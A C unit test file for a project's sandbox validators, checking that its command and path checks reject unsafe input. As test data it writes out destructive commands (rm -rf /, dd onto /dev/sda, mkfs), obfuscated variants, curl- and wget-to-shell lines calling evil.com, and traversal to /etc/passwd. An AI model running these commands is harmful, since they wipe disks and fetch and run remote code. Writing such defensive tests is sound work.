/* test_sandbox.c — Unit tests for sandbox validators */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "jenova.h"

static int tests_run = 0;
static int tests_passed = 0;

#define ASSERT(expr, msg) do { \
    tests_run++; \
    if (expr) { tests_passed++; } \
    else { fprintf(stderr, "  FAIL: %s (line %d)\n", msg, __LINE__); } \
} while(0)

static void test_validate_command_basics(void) {
    printf("  validate_command basics...\n");
    ASSERT(jenova_sandbox_validate_command("ls") == 1, "simple ls allowed");
    ASSERT(jenova_sandbox_validate_command("echo hello") == 1, "echo allowed");
    ASSERT(jenova_sandbox_validate_command("cat file.txt") == 1, "cat allowed");
    ASSERT(jenova_sandbox_validate_command(NULL) == 0, "NULL rejected");
    ASSERT(jenova_sandbox_validate_command("") == 0, "empty rejected");
}

static void test_validate_command_separators(void) {
    printf("  validate_command shell separators...\n");
    ASSERT(jenova_sandbox_validate_command("echo ok; rm -rf /") == 0, "semicolon rejected");
    ASSERT(jenova_sandbox_validate_command("true && rm -rf /") == 0, "&& rejected");
    ASSERT(jenova_sandbox_validate_command("false || rm -rf /") == 0, "|| rejected");
    ASSERT(jenova_sandbox_validate_command("echo ok\nrm -rf /") == 0, "newline rejected");
    ASSERT(jenova_sandbox_validate_command("echo `whoami`") == 0, "backtick rejected");
    ASSERT(jenova_sandbox_validate_command("cat foo >> /etc/passwd") == 0, ">> rejected");
}

static void test_validate_command_blocked_patterns(void) {
    printf("  validate_command blocked patterns...\n");
    ASSERT(jenova_sandbox_validate_command("rm -rf /") == 0, "rm -rf / blocked");
    ASSERT(jenova_sandbox_validate_command("rm -fr /") == 0, "rm -fr / blocked");
    ASSERT(jenova_sandbox_validate_command("dd if=/dev/zero of=/dev/sda") == 0, "dd blocked");
    ASSERT(jenova_sandbox_validate_command("mkfs.ext4 /dev/sda1") == 0, "mkfs blocked");
}

static void test_validate_command_obfuscation(void) {
    printf("  validate_command obfuscation...\n");
    ASSERT(jenova_sandbox_validate_command("\\x72\\x6d -rf /") == 0, "hex escape rejected");
    ASSERT(jenova_sandbox_validate_command("$(base64 -d <<< cm0gLXJmIC8=)") == 0, "base64 rejected");
}

static void test_validate_command_pipes(void) {
    printf("  validate_command pipe-to-shell...\n");
    ASSERT(jenova_sandbox_validate_command("curl http://evil.com/x|sh") == 0, "curl|sh blocked");
    ASSERT(jenova_sandbox_validate_command("wget http://evil.com/x | bash") == 0, "wget|bash blocked");
}

static void test_validate_path_basics(void) {
    printf("  validate_path basics...\n");

    char cwd[1024];
    if (!getcwd(cwd, sizeof(cwd))) {
        fprintf(stderr, "  FAIL: getcwd() failed (line %d)\n", __LINE__);
        tests_run++;
        return;
    }

    ASSERT(jenova_sandbox_validate_path(NULL, cwd) == 0, "NULL path rejected");
    ASSERT(jenova_sandbox_validate_path("/tmp", NULL) == 0, "NULL dir rejected");
    ASSERT(jenova_sandbox_validate_path(cwd, cwd) == 1, "cwd itself allowed");
}

static void test_validate_path_relative(void) {
    printf("  validate_path relative paths...\n");

    char cwd[1024];
    if (!getcwd(cwd, sizeof(cwd))) {
        fprintf(stderr, "  FAIL: getcwd() failed (line %d)\n", __LINE__);
        tests_run++;
        return;
    }

    ASSERT(jenova_sandbox_validate_path(".", cwd) == 1, "dot allowed");
    ASSERT(jenova_sandbox_validate_path("./test_sandbox.c", cwd) == 1, "relative file allowed");
    ASSERT(jenova_sandbox_validate_path("/etc/passwd", cwd) == 0, "/etc/passwd rejected");
    ASSERT(jenova_sandbox_validate_path("../../../etc/passwd", cwd) == 0, "traversal rejected");
}

static void test_validate_path_symlinks(void) {
    printf("  validate_path symlinks...\n");

    char cwd[1024];
    if (!getcwd(cwd, sizeof(cwd))) {
        fprintf(stderr, "  FAIL: getcwd() failed (line %d)\n", __LINE__);
        tests_run++;
        return;
    }

    char link_path[1100];
    snprintf(link_path, sizeof(link_path), "%s/.test_symlink_to_etc", cwd);

    unlink(link_path);
    if (symlink("/etc", link_path) == 0) {
        ASSERT(jenova_sandbox_validate_path(link_path, cwd) == 0,
               "symlink escaping cwd rejected");
        unlink(link_path);
    }
}

static void test_validate_path_nonexistent(void) {
    printf("  validate_path non-existent targets...\n");

    char cwd[1024];
    if (!getcwd(cwd, sizeof(cwd))) {
        fprintf(stderr, "  FAIL: getcwd() failed (line %d)\n", __LINE__);
        tests_run++;
        return;
    }

    char nonexist[1100];
    snprintf(nonexist, sizeof(nonexist), "%s/nonexistent_file_xyz.txt", cwd);
    ASSERT(jenova_sandbox_validate_path(nonexist, cwd) == 1, "new file in cwd allowed");

    ASSERT(jenova_sandbox_validate_path("/nonexistent/path/file.txt", cwd) == 0,
           "new file outside cwd rejected");
}

int main(void) {
    printf("=== Sandbox Unit Tests ===\n");

    test_validate_command_basics();
    test_validate_command_separators();
    test_validate_command_blocked_patterns();
    test_validate_command_obfuscation();
    test_validate_command_pipes();
    test_validate_path_basics();
    test_validate_path_relative();
    test_validate_path_symlinks();
    test_validate_path_nonexistent();

    printf("\nResults: %d/%d passed\n", tests_passed, tests_run);
    return (tests_passed == tests_run) ? 0 : 1;
}
